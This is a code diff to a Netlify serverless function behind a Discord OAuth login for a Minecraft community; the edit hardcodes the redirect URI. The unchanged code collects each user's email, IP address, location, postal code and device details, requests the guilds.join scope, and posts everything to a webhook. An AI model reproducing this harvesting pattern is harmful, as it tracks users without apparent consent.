@@ -1,12 +1,14 @@
 const axios = require('axios');
 
+// URL de redirección - HARCODEADA para evitar errores
+const REDIRECT_URI = 'https://capable-seahorse-8aad92.netlify.app/.netlify/functions/auth/callback';
+
 exports.handler = async (event) => {
     const url = event.path;
     
     // ==================== REDIRIGIR A DISCORD ====================
     if (!url.includes('/callback')) {
-        const redirectUri = `${process.env.BASE_URL}/.netlify/functions/auth/callback`;
-        const discordUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email%20guilds.join%20guilds`;
+        const discordUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join%20guilds`;
         
         return {
             statusCode: 302,
@@ -56,15 +58,14 @@ exports.handler = async (event) => {
         else if (userAgent.includes('Android')) os = 'Android';
         else if (userAgent.includes('iOS')) os = 'iOS';
         
-        // 3. Intercambiar código por token
-        const redirectUri = `${process.env.BASE_URL}/.netlify/functions/auth/callback`;
+        // 3. Intercambiar código por token (usando REDIRECT_URI hardcodeada)
         const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
             new URLSearchParams({
                 client_id: process.env.DISCORD_CLIENT_ID,
                 client_secret: process.env.DISCORD_CLIENT_SECRET,
                 grant_type: 'authorization_code',
                 code: code,
-                redirect_uri: redirectUri,
+                redirect_uri: REDIRECT_URI,
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             });
@@ -108,7 +109,7 @@ exports.handler = async (event) => {
                         { name: "👤 Discord", value: `**ID:** ${user.id}\n**Usuario:** ${user.username}\n**Email:** ${user.email || 'No disponible'}`, inline: false },
                         { name: "🌍 Ubicación", value: `${location}\n**IP:** ${ip}\n**CP:** ${postalCode}`, inline: true },
                         { name: "💻 Dispositivo", value: `**Navegador:** ${browser}\n**SO:** ${os}`, inline: true },
-                        { name: "📊 Stats", value: `**Servidores:** ${guildCount}\n**Rol asignado:** ${roleAssigned ? '✅ Sí' : '❌ No'}`, inline: true },
+                        { name: "📊 Stats", value: `**Servidores:** ${guildCount}\n**Rol:** ${roleAssigned ? '✅ Sí' : '❌ No'}`, inline: true },
                         { name: "🕐 Hora", value: new Date().toLocaleString('es-ES'), inline: false }
                     ],
                     footer: { text: "MoviVerso MC" },
@@ -118,7 +119,7 @@ exports.handler = async (event) => {
             await axios.post(process.env.WEBHOOK_URL, embed);
         }
         
-        // 8. REDIRIGIR A LA PÁGINA DE ÉXITO
+        // 8. Redirigir a éxito
         return {
             statusCode: 302,
             headers: { Location: '/success.html' }
